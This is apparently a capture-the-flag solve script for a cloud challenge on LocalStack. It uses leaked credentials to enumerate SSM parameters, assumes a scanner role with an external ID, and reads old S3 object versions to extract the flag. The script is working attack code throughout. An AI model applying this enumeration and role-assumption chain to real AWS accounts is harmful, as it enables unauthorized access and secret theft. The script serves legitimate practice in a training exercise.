#!/usr/bin/env python3
"""False Ferry - HTB Cyber Apocalypse 2026 (cloud / AWS on LocalStack).

Cadena:
  1. creds del clerk en GET :31076/player-creds.json ; endpoint AWS = :30411.
  2. SSM: DescribeParameters (GetParametersByPath denegado) -> namespace /ferry/crossing/.
  3. GetParameter CROSSING-7A3F -> bucket S3 versionado + rol scanner + external id.
  4. sts:AssumeRole (ExternalId) -> s3:ListObjectVersions -> leer la version original -> flag.

Uso: .venv/bin/python solve.py
"""
import json, urllib.request, boto3

BRIEFING = "http://154.57.164.82:31076"
AWS_EP = "http://154.57.164.82:30411"

creds = json.load(urllib.request.urlopen(BRIEFING + "/player-creds.json"))
base = dict(region_name=creds["region"], endpoint_url=AWS_EP,
           aws_access_key_id=creds["access_key_id"],
           aws_secret_access_key=creds["secret_access_key"])

ssm = boto3.client("ssm", **base)
sts = boto3.client("sts", **base)

# 2) catalogar namespace (GetParametersByPath esta denegado; DescribeParameters no)
names = [p["Name"] for p in ssm.describe_parameters()["Parameters"]]
live = ssm.get_parameter(Name="/ferry/crossing/live-crossing-id")["Parameter"]["Value"]
rec = json.loads(ssm.get_parameter(Name=f"/ferry/crossing/{live}")["Parameter"]["Value"])
print("[*] live crossing:", live)

# 3) asumir el rol scanner con el external id
c = sts.assume_role(RoleArn=rec["scanner_role_arn"], RoleSessionName="lysa",
                    ExternalId=rec["scanner_external_id"])["Credentials"]
s3 = boto3.client("s3", region_name=creds["region"], endpoint_url=AWS_EP,
                  aws_access_key_id=c["AccessKeyId"],
                  aws_secret_access_key=c["SecretAccessKey"],
                  aws_session_token=c["SessionToken"])

# 4) recuperar TODAS las versiones del manifiesto y buscar la flag
bucket, key = rec["manifest_bucket"], rec["manifest_object_key"]
vers = s3.list_object_versions(Bucket=bucket, Prefix=key).get("Versions", [])
for v in vers:
    body = s3.get_object(Bucket=bucket, Key=key, VersionId=v["VersionId"])["Body"].read().decode("utf-8", "replace")
    if "HTB{" in body:
        print("[+] flag en version", v["VersionId"])
        print(body.strip().splitlines()[-1])
